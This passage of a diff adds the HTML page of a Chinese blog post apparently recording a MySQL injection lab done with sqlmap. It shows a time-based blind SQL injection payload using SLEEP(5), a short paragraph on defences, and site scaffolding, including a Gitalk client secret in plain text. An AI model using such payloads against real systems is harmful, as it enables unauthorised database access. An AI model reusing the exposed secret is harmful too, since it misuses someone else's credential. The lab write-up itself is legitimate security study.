+<p>op=6&amp;id=11110000001%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29msbv%29%20AND%20%27lJma%27%3D%27lJma&amp;score=66 </p>
+<p><code>op=6&amp;id=11110000001&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))msbv) AND &#39;lJma&#39;=&#39;lJma&amp;score=66</code></p>
+<h2 id="SQL注入的防御"><a href="#SQL注入的防御" class="headerlink" title="SQL注入的防御"></a>SQL注入的防御</h2><p>SQL注入漏洞的一般性防范措施是预编译SQL查询语句，让查询语句参数化，秉持着用户输入的数据与代码相分离的原则。当然，对于数据库的操作权限进行严格的控制，对关键字符的过滤以及增加随机化参数等措施都能够在一定程度上对sql注入进行防御。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    HengYuD
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://hengyud.cn/mysql注入测试实验/" title="mysql注入测试实验">https://hengyud.cn/mysql注入测试实验/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/MySQL注入实验/" rel="tag"># MySQL注入实验</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/网络设备性能测试/" rel="next" title="网络设备性能测试">
+                <i class="fa fa-chevron-left"></i> 网络设备性能测试
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="gitalk-container"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/1.jpg" alt="HengYuD">
+            
+              <p class="site-author-name" itemprop="name">HengYuD</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a rel="external nofollow" href="https://github.com/HengYuD" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a rel="external nofollow" href="mailto:HengYuDD@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.ama666.cn/" title="ama666" rel="external nofollow" target="_blank">ama666</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#实验目的"><span class="nav-number">1.</span> <span class="nav-text">实验目的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验环境"><span class="nav-number">2.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验步骤"><span class="nav-number">3.</span> <span class="nav-text">实验步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#功能实现并手工注入"><span class="nav-number">4.</span> <span class="nav-text">功能实现并手工注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#用-sqlmap-尝试各种注入方式并用-wireshark-抓包，记录每次的目标、SQL-命令行、结果（包括出结果的过程、和最终的输出）、和抓包文件"><span class="nav-number">5.</span> <span class="nav-text">用 sqlmap 尝试各种注入方式并用 wireshark 抓包，记录每次的目标、SQL 命令行、结果（包括出结果的过程、和最终的输出）、和抓包文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#op-1"><span class="nav-number">5.1.</span> <span class="nav-text">op=1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#op-2"><span class="nav-number">5.2.</span> <span class="nav-text">op=2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#op-3"><span class="nav-number">5.3.</span> <span class="nav-text">op=3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#op-4"><span class="nav-number">5.4.</span> <span class="nav-text">op=4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#op-5"><span class="nav-number">5.5.</span> <span class="nav-text">op=5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#op-6"><span class="nav-number">5.6.</span> <span class="nav-text">op=6</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入的防御"><span class="nav-number">6.</span> <span class="nav-text">SQL注入的防御</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+    
+    
+    
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">HengYuD</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">24.8k</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: '0b490ffdffc97947ae5d',
+          clientSecret: '7668cc8cfeaf79704cbb8c064cecbdcf2ea056f3',
+          repo: 'HengYuD.github.io',
+          owner: 'HengYuD',
+          admin: ['HengYuD'],
+          id: md5(location.pathname),
+          labels: 'gitalk'.split(',').filter(l => l),
+          perPage: 10,
+          pagerDirection: 'last',
+          createIssueManually: false,
+          distractionFreeMode: false
+        })
+        gitalk.render('gitalk-container')           
+       </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
